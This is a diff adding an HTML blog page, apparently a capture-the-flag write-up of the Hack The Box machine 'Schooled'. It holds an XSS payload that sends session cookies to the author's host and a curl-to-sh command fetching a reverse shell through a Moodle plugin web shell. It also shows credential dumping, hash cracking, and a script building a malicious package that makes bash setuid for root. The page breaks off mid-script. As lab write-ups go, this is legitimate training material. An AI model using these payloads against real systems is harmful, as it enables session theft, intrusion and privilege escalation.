@@ -1,0 +1,623 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.3 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Writeup: HackTheBox - Schooled - #keepLearning</title>
+<meta name="description" content="Write-up of the box Schooled from Hack The Box">
+
+
+  <meta name="author" content="Philipp Menner">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="#keepLearning">
+<meta property="og:title" content="Writeup: HackTheBox - Schooled">
+<meta property="og:url" content="http://localhost:4000/boxes/Schooled/">
+
+
+  <meta property="og:description" content="Write-up of the box Schooled from Hack The Box">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2021-04-04T21:33:36-04:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/boxes/Schooled/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Philipp Menner",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="#keepLearning Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--secret_post">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/88x88.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          #keepLearning
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+
+
+  <div class="archive">
+    
+      <h1 id="page-title" class="page__title">Writeup: HackTheBox - Schooled</h1>
+    
+    <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Writeup: HackTheBox - Schooled</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2021-04-04T21:33:36-04:00" itemprop="datePublished">Apr 4, 2021
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">  
+
+    <div id ="secure-container" style="display: none;">
+        <div id ="0db9774b86aa5a219a0939cdd5c5aa08">
+          <h1 id="overview">Overview</h1>
+<p>home page:</p>
+<ul>
+  <li>mentioning moodle</li>
+  <li>hostname admissions@schooled.htb</li>
+  <li>phillips_manuel@staff.schooled.htb
+We find the moodle subdomain by fuzzing:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <span class="nt">-u</span> http://schooled.htb <span class="nt">-H</span> <span class="s2">"Host: FUZZ.schooled.htb"</span> <span class="nt">-fw</span> 5338
+<span class="go">[snip]
+moodle                  [Status: 200, Size: 84, Words: 5, Lines: 2]
+:: Progress: [4989/4989] :: Job [1/1] :: 451 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
+</span></code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>Adding the subdomain to the hosts file and browsing there reveales a login page and some courses and their teachers</p>
+<h1 id="moodle-enumeration">Moodle enumeration</h1>
+<p>When logging in we notice we need to add a <code class="language-plaintext highlighter-rouge">student.schooled.htb</code> email address:</p>
+<blockquote>
+  <p>This email is not one of those that are allowed (student.schooled.htb)
+and upon logging in we see that there is also <code class="language-plaintext highlighter-rouge">staff.schooled.htb</code> available. Furthermore we are allowed to enroll to the Maths course and read an Announcement by Manuel Phillips (phillips_manuel@staff.schooled.htb) asking us to set a “MoodleNet profile”:
+This is a self enrollment course. For students who wish to attend my lectures be sure that you have your MoodleNet profile set.</p>
+
+  <p>Students who do not set their MoodleNet profiles will be  removed from the course before the course is due to start and I will be checking all students who are enrolled on this course.</p>
+</blockquote>
+
+<p>Searching this term shows serious XSS vulnerabilities and we can test this by browsing to our profile page and setting <code class="language-plaintext highlighter-rouge">&lt;script&gt;alert(1)&lt;/script&gt;</code> as MoodleNet profile. And indeed when browsing to our profile we are greeted by our beloved alert(1) message.
+What’s XSS good for? For example for cookie stealing - and this is achieved quite simply:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">x</span> <span class="na">onerror=</span><span class="s">this.src='http://10.10.14.11:8000/?c='+document.cookie</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+<p>By using this payload as MoodleNet profile and Manuel Phillips checking our profile every 1-2 minutes we get him to send his MoodleSession cookie to our nc listener:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 8000
+<span class="go">Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::8000
+Ncat: Listening on 0.0.0.0:8000
+Ncat: Connection from 10.10.10.234.
+Ncat: Connection from 10.10.10.234:61499.
+GET /?c=MoodleSession=rssligl546d8mi4v5cqcico22u HTTP/1.1
+Host: 10.10.14.11:8000
+</span><span class="gp">User-Agent: Mozilla/5.0 (X11;</span><span class="w"> </span>FreeBSD amd64<span class="p">;</span> rv:86.0<span class="o">)</span> Gecko/20100101 Firefox/86.0
+<span class="go">Accept: image/webp,*/*
+</span><span class="gp">Accept-Language: en-US,en;</span><span class="nv">q</span><span class="o">=</span>0.5
+<span class="go">Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer: http://moodle.schooled.htb/moodle/user/profile.php?id=28
+</span></code></pre></div></div>
+<p>After overwriting our cookie with his and refreshing the page we upgraded from a student to teacher.</p>
+<h2 id="from-teacher-to-manager-to-rce">From teacher to manager to RCE</h2>
+<p>We pretty much follow the CVE-2020-24321 outlined in detail <a href="https://www.youtube.com/watch?v=BkEInFI4oIU">here</a>.
+After catching and modifying the enroll request for <code class="language-plaintext highlighter-rouge">Lianne Carter</code> and logging in as her we see the button <code class="language-plaintext highlighter-rouge">Site administration</code> on the bottom left hand side. This is a sure sign that we are on the right track. Then:</p>
+
+<p>-&gt; Users -&gt; Define Roles -&gt; Manager -&gt; Edit -&gt; Scrolling all the way down -&gt; Turn intercept on in Burp -&gt; Save changes in moodle -&gt; replace the huge payload after <code class="language-plaintext highlighter-rouge">&amp;return=...</code> with the payload from the author’s <a href="https://github.com/HoangKien1020/CVE-2020-14321">github</a> page.</p>
+
+<p>Having done that we can gain RCE by installing a plugin. We do this following these steps:
+Site administration -&gt; Plugins -&gt; Install plugins -&gt; Choose a file… -&gt; Upload a file -&gt; Choose file -&gt; rce.zip -&gt; upload this file -&gt; Install plugin from the ZIP file
+Browsing to <code class="language-plaintext highlighter-rouge">http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=whoami</code> should now display the user <code class="language-plaintext highlighter-rouge">www</code>.</p>
+
+<p>We need to be quick now because our php file that gives us rce will disappear relatively fast. First I did not manage to get a reverse shell and enumerated manually using this small shell. The <code class="language-plaintext highlighter-rouge">config.php</code> file from moodle revealed mysql creds:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span><span class="n">CFG</span><span class="o">-&gt;</span><span class="n">dbtype</span>    <span class="o">=</span> <span class="s1">'mysqli'</span><span class="p">;</span>
+<span class="err">$</span><span class="n">CFG</span><span class="o">-&gt;</span><span class="n">dblibrary</span> <span class="o">=</span> <span class="s1">'native'</span><span class="p">;</span>
+<span class="err">$</span><span class="n">CFG</span><span class="o">-&gt;</span><span class="n">dbhost</span>    <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span>
+<span class="err">$</span><span class="n">CFG</span><span class="o">-&gt;</span><span class="n">dbname</span>    <span class="o">=</span> <span class="s1">'moodle'</span><span class="p">;</span>
+<span class="err">$</span><span class="n">CFG</span><span class="o">-&gt;</span><span class="n">dbuser</span>    <span class="o">=</span> <span class="s1">'moodle'</span><span class="p">;</span>
+<span class="err">$</span><span class="n">CFG</span><span class="o">-&gt;</span><span class="n">dbpass</span>    <span class="o">=</span> <span class="s1">'PlaybookMaster2020'</span><span class="p">;</span>
+<span class="err">$</span><span class="n">CFG</span><span class="o">-&gt;</span><span class="k">prefix</span>    <span class="o">=</span> <span class="s1">'mdl_'</span><span class="p">;</span>
+</code></pre></div></div>
+<p>As I cannot access this DB from our simple shell and the PW doesnt work for the users jamie and steve on the box I went back to obtaining a shell. The major hurdle for this was <code class="language-plaintext highlighter-rouge">curl</code> not being in the <code class="language-plaintext highlighter-rouge">$PATH</code> so I had to <code class="language-plaintext highlighter-rouge">find / -name curl 2&gt;/dev/null</code> and call it with an absolute path to upload a shell script to execute the reverse shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="sb">```</span>python <span class="nt">-m</span> http.server 1111
+<span class="go">Serving HTTP on 0.0.0.0 port 1111 (http://0.0.0.0:1111/) ...
+10.10.10.234 - - [04/Apr/2021 14:11:32] "GET /rev.ksh HTTP/1.1" 200 -
+</span></code></pre></div></div>
+<p>Trying to use korn shell at first also delayed the process.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=/usr/local/bin/curl%2010.10.14.11:1111/rev.ksh|sh
+
+</span><span class="gp">$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 1234
+<span class="go">Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.10.10.234.
+Ncat: Connection from 10.10.10.234:33034.
+</span><span class="gp">sh: can't access tty;</span><span class="w"> </span>job control turned off
+<span class="gp">$</span><span class="w">
+</span></code></pre></div></div>
+<p>Now we can query the database and search for jamie and steve:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>/usr/local/bin/mysql <span class="nt">--database</span><span class="o">=</span>moodle <span class="nt">--user</span><span class="o">=</span><span class="s2">"moodle"</span> <span class="nt">--password</span> <span class="nt">--execute</span><span class="o">=</span><span class="s2">"select * from mdl_user;"</span>
+<span class="go">Enter password: PlaybookMaster2020
+[snip]
+</span><span class="gp">2       manual  1       0       0       0       1       admin   $</span>2y<span class="nv">$10$3D</span>/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW                Jamie   Borham  jamie@staff.schooled.htb 
+<span class="go">[snip]
+</span></code></pre></div></div>
+<p>Cracking the hash takes a while but results in <code class="language-plaintext highlighter-rouge">!QAZ2wsx</code>. This password allows us to ssh into the box as jamie and collect the user flag.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ssh jamie@10.10.10.234
+<span class="go">Password for jamie@Schooled:
+[snip]
+</span><span class="gp">jamie@Schooled:~ $</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">user.txt
+</span><span class="gp">jamie@Schooled:~ $</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">420e9c891c14e6c92c3f952907f0ccf4
+</span></code></pre></div></div>
+<h1 id="root">Root</h1>
+<p>As always, I start with <code class="language-plaintext highlighter-rouge">sudo -l</code> and find:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jamie@Schooled:~ $</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">User jamie may run the following commands on Schooled:
+    (ALL) NOPASSWD: /usr/sbin/pkg update
+    (ALL) NOPASSWD: /usr/sbin/pkg install *
+</span></code></pre></div></div>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">jamie@Schooled:/etc/pkg % cat FreeBSD.conf
+</span><span class="gp">#</span><span class="w"> </span><span class="nv">$FreeBSD</span><span class="err">$</span>
+<span class="gp">#</span><span class="w">
+</span><span class="gp">#</span><span class="w"> </span>To disable this repository, instead of modifying or removing this file,
+<span class="gp">#</span><span class="w"> </span>create a /usr/local/etc/pkg/repos/FreeBSD.conf file:
+<span class="gp">#</span><span class="w">
+</span><span class="gp">#</span><span class="w">   </span><span class="nb">mkdir</span> <span class="nt">-p</span> /usr/local/etc/pkg/repos
+<span class="gp">#</span><span class="w">   </span><span class="nb">echo</span> <span class="s2">"FreeBSD: { enabled: no }"</span> <span class="o">&gt;</span> /usr/local/etc/pkg/repos/FreeBSD.conf
+<span class="gp">#</span><span class="w">
+</span><span class="go">
+FreeBSD: {
+	url: "pkg+http://devops.htb:80/packages",
+	mirror_type: "srv",
+	signature_type: "none",
+	fingerprints: "/usr/share/keys/pkg",
+	enabled: yes
+}
+jamie@Schooled:~ % cat /usr/share/keys/pkg/trusted/pkg.freebsd.org.2013102301
+</span><span class="gp">#</span><span class="w"> </span><span class="nv">$FreeBSD</span><span class="err">$</span>
+<span class="go">
+function: "sha256"
+fingerprint: "b0170035af3acc5f3f3ae1859dc717101b4e6c1d0a794ad554928ca0cbb2f438"
+</span></code></pre></div></div>
+<p>To resolve <code class="language-plaintext highlighter-rouge">devops.htb</code> it is probably added to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>, and indeed it is:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">jamie@Schooled:/etc % cat hosts
+</span><span class="gp">#</span><span class="w"> </span><span class="nv">$FreeBSD</span><span class="err">$</span>
+<span class="gp">#</span><span class="w">
+</span><span class="gp">#</span><span class="w"> </span>Host Database
+<span class="go">
+[snip]
+
+::1                     localhost localhost.my.domain
+127.0.0.1               localhost localhost.my.domain Schooled schooled.htb moodle.schooled.htb
+192.168.1.14            devops.htb
+[snip]
+</span></code></pre></div></div>
+<p>And to my surprise, we as a member of the wheel group are have write access to that file!</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">jamie@Schooled:/etc % ls -l hosts
+-rw-rw-r--  1 root  wheel  1098 Mar 17 15:47 hosts
+jamie@Schooled:/etc % id
+uid=1001(jamie) gid=1001(jamie) groups=1001(jamie),0(wheel)
+</span></code></pre></div></div>
+<p>So we just change the ip of devops.htb to our local ip. And by doing so we see that that <code class="language-plaintext highlighter-rouge">pkg</code> will look up our host to fetch files:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>python <span class="nt">-m</span> http.server 80
+<span class="go">[sudo] password for kali:
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.234 - - [05/Apr/2021 05:54:22] code 404, message File not found
+10.10.10.234 - - [05/Apr/2021 05:54:22] "GET /packages/meta.conf HTTP/1.1" 404 -
+10.10.10.234 - - [05/Apr/2021 05:54:22] code 404, message File not found
+10.10.10.234 - - [05/Apr/2021 05:54:22] "GET /packages/meta.txz HTTP/1.1" 404 -
+10.10.10.234 - - [05/Apr/2021 05:54:22] code 404, message File not found
+10.10.10.234 - - [05/Apr/2021 05:54:22] "GET /packages/packagesite.txz HTTP/1.1" 404 -
+</span></code></pre></div></div>
+<p>As the box is using FreeBSD 13 amd 64 we browse to <a href="http://pkg.freebsd.org/FreeBSD:13:amd64/latest/">here</a> to get and host these three files. After having done that, we need to find out how to create a <code class="language-plaintext highlighter-rouge">.pkg</code> file that does what we want. Luckily there is <a href="http://lastsummer.de/creating-custom-packages-on-freebsd/">this page</a> which we basically only have to copy and paste from. Go check out his page for more details. The full exploit is down <a href="#fullExpl">below</a>.
+Usually I would maybe cat the root flag somewhere or send a reverse shell but this time I wanted to try something cool, which is inspired by <code class="language-plaintext highlighter-rouge">xct</code> who likes to set the setuid bit on <code class="language-plaintext highlighter-rouge">bash</code>.
+So I changed</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">pw usermod -n root -s /bin/csh
+</span><span class="gp">#</span><span class="w"> </span>to
+<span class="go">chmod u+s /bin/bash
+</span></code></pre></div></div>
+<p>and executed quickly (the files will be deleted very frequently) the following steps:</p>
+<ul>
+  <li>safe the <a href="#fullExpl">payload</a> to /tmp/payload.sh</li>
+  <li>run <code class="language-plaintext highlighter-rouge">sh /tmp/payload.sh</code> that creates the file <code class="language-plaintext highlighter-rouge">/tmp/mypackage-1.0_5.txz</code></li>
+  <li>safe the edited <code class="language-plaintext highlighter-rouge">/etc/hosts</code> that contains my IP</li>
+  <li>run <code class="language-plaintext highlighter-rouge">$ sudo /usr/sbin/pkg install /tmp/mypackage-1.0_5.txz</code> and confirm to install</li>
+</ul>
+
+<p>This results in:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jamie@Schooled:/tmp $</span><span class="w"> </span><span class="nb">sudo</span> /usr/sbin/pkg <span class="nb">install</span> ./mypackage-1.0_5.txz
+<span class="go">Updating FreeBSD repository catalogue...
+FreeBSD repository is up to date.
+All repositories are up to date.
+Checking integrity... done (0 conflicting)
+The following 1 package(s) will be affected (of 0 checked):
+
+New packages to be INSTALLED:
+        mypackage: 1.0_5
+
+Number of packages to be installed: 1
+
+Proceed with this action? [y/N]: y
+[1/1] Installing mypackage-1.0_5...
+Extracting mypackage-1.0_5: 100%
+Registering root shell
+</span><span class="gp">jamie@Schooled:/tmp $</span><span class="w"> </span>/bin/bash <span class="nt">-p</span>
+<span class="gp">[jamie@Schooled /tmp]#</span><span class="w"> </span><span class="nb">whoami</span>
+<span class="go">root
+</span></code></pre></div></div>
+<p>Awesome box! Thanks for making.</p>
+
+<h1 id="appendix">Appendix</h1>
+<h2 id="nmap-scan">Nmap scan</h2>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> initial.nmap <span class="nt">-p-</span> 10.10.10.234
+<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-04 05:08 EDT
+Nmap scan report for 10.10.10.234
+Host is up (0.028s latency).
+Not shown: 65532 closed ports
+PORT      STATE SERVICE VERSION
+</span><span class="gp">22/tcp    open  ssh     OpenSSH 7.9 (FreeBSD 20200214;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
+<span class="go">| ssh-hostkey:
+|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)
+|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)
+|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)
+80/tcp    open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15
+|_http-title: Schooled - A new kind of educational institute
+33060/tcp open  mysqlx?
+| fingerprint-strings:
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
+|     Invalid message"
+|     HY000
+|   LDAPBindReq:
+|     *Parse error unserializing protobuf message"
+|     HY000
+|   oracle-tns:
+|     Invalid message-frame."
+|_    HY000
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+[snip]
+</span><span class="gp">Service Info: OS: FreeBSD;</span><span class="w"> </span>CPE: cpe:/o:freebsd:freebsd
+<span class="go">
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 722.13 seconds
+</span></code></pre></div></div>
+<h2 id="fuff-scan">Fuff Scan</h2>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <span class="nt">-u</span> http://schooled.htb <span class="nt">-H</span> <span class="s2">"Host: FUZZ.schooled.htb"</span> <span class="nt">-fw</span> 5338
+<span class="go">
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+  
+  		v1.3.0 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://schooled.htb
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.schooled.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response words: 5338
+_________________________________________________
+
+moodle                  [Status: 200, Size: 84, Words: 5, Lines: 2]
+:: Progress: [4989/4989] :: Job [1/1] :: 451 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
+</span></code></pre></div></div>
+<h2 id="john-output">John output</h2>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt hashes.txt
+<span class="go">Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+!QAZ2wsx         (?)
+1g 0:00:01:31 DONE (2021-04-05 03:33) 0.01091g/s 152.1p/s 152.1c/s 152.1C/s 071189..navigator
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+</span></code></pre></div></div>
+<h2 id="full-root-payload"><a href="#fullExpl">Full root payload</a></h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
+
+<span class="nv">STAGEDIR</span><span class="o">=</span>/tmp/stage
+<span class="nb">rm</span> <span class="nt">-rf</span> <span class="k">${</span><span class="nv">STAGEDIR</span><span class="k">}</span>
+<span class="nb">mkdir</span> <span class="nt">-p</span> <span class="k">${</span><span class="nv">STAGEDIR</span><span class="k">}</span>
+
+<span class="nb">cat</span> <span class="o">&gt;&gt;</span> <span class="k">${</span><span class="nv">STAGEDIR</span><span class="k">}</span>/+PRE_DEINSTALL <span class="o">&lt;&lt;</span><span class="no">EOF</span><span class="sh">
+# careful here, this may clobber your system
+echo "Resetting root shell"
+chmod u+s /bin/bash
+</span><span class="no">EOF
+
+</span><span class="nb">cat</span> <span class="o">&gt;&gt;</span> <span class="k">${</span><span class="nv">STAGEDIR</span><span class="k">}</span>/+POST_INSTALL <span class="o">&lt;&lt;</span><span class="no">EOF</span><span class="sh">
+# careful here, this may clobber your system
+echo "Registering root shell"
+chmod u+s /bin/bash
+</span><span class="no">EOF
+
+</span><span class="nb">cat</span> <span class="o">&gt;&gt;</span> <span class="k">${</span><span class="nv">STAGEDIR</span><span class="k">}</span>/+MANIFEST <span class="o">&lt;&lt;</span><span class="no">EOF</span><span class="sh">
+name: mypackage
+version: "1.0_5"
+origin: sysutils/mypackage
+comment: "automates stuff"
+desc: "automates tasks which can also be undone later"
+maintainer: john@doe.it
+www: https://doe.it
+prefix: /
+</span><span class="no">EOF
+
+</span><span class="nb">echo</span> <span class="s2">"deps: {"</span> <span class="o">&gt;&gt;</span> <span class="k">${</span><span class="nv">STAGEDIR</span><span class="k">}</span>/+MANIFEST
+pkg query <span class="s2">"  %n: { version: </span><span class="se">\"</span><span class="s2">%v</span><span class="se">\"</span><span class="s2">, origin: %o }"</span> portlint <span class="o">&gt;&gt;</span> <span class="k">${</span><span class="nv">STAGEDIR</span><span class="k">}</span>/+MANIFEST
+pkg query <span class="s2">"  %n: { version: </span><span class="se">\"</span><span class="s2">%v</span><span class="se">\"</span><span class="s2">, origin: %o }"</span> poudriere <span class="o">&gt;&gt;</span> <span class="k">${</span><span class="nv">STAGEDIR</span><span class="k">}</span>/+MANIFEST
+<span class="nb">echo</span> <span class="s2">"}"</span> <span class="o">&gt;&gt;</span> <span class="k">${</span><span class="nv">STAGEDIR</span><span class="k">}</span>/+MANIFEST
+
+<span class="nb">mkdir</span> <span class="nt">-p</span> <span class="k">${</span><span class="nv">STAGEDIR</span><span class="k">}</span>/usr/local/etc
+<span class="nb">echo</span> <span class="s2">"# hello world"</span> <span class="o">&gt;</span> <span class="k">${</span><span class="nv">STAGEDIR</span><span class="k">}</span>/usr/local/etc/my.conf
+<span class="nb">echo</span> <span class="s2">"/usr/local/etc/my.conf"</span> <span class="o">&gt;</span> <span class="k">${</span><span class="nv">STAGEDIR</span><span class="k">}</span>/plist
+
+pkg create <span class="nt">-m</span> <span class="k">${</span><span class="nv">STAGEDIR</span><span class="k">}</span>/ <span class="nt">-r</span> <span class="k">${</span><span class="nv">STAGEDIR</span><span class="k">}</span>/ <span class="nt">-p</span> <span class="k">${</span><span class="nv">STAGEDIR</span><span class="k">}</span>/plist <span class="nt">-o</span> <span class="nb">.</span>
+</code></pre></div></div>
+
+        </div>
+    </div>
+
+    <div id="decryptor">
+      This is an active machine - please enter the password to view this content.<br/><br/>
+      <input id="key" type="text" value="">
+      <input id="decrypt" type="button" value="Decrypt">
+    </div>
+  </div><a class="u-url" href="/boxes/Schooled/" hidden></a>
+</article>
+
+<!-- post decryption -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="https://cdn.rawgit.com/ricmoo/aes-js/e27b99df/index.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/js-sha256/0.9.0/sha256.js"></script>
+<script>
+  var storedEncrypted = '';
+  function decrypt(key) {
+    var text = storedEncrypted;
+    var keyArray = sha256.update(key + _gj.salt).array();
+    var iv = aesjs.utils.hex.toBytes(_gj.iv);
+    var encryptedBytes = aesjs.utils.hex.toBytes(text);
+    var aesCbc = new aesjs.ModeOfOperation.cbc(keyArray, iv);
+    var decryptedBytes = aesCbc.decrypt(encryptedBytes);
+    var final = aesjs.utils.utf8.fromBytes(decryptedBytes);
+
+    if (final.includes("0db9774b86aa5a219a0939cdd5c5aa08")){
+      var text = $($.parseHTML(final)).filter('#0db9774b86aa5a219a0939cdd5c5aa08').html();
+      $('#secure-container').html(text);
+      $('#secure-container').show();
+      $('#decryptor').hide(); 
+    }else{
+      // invalid key
+    }
+    
+       
+  }    
+  $(document).ready(function() {
+    $( "#decrypt" ).click(function() {
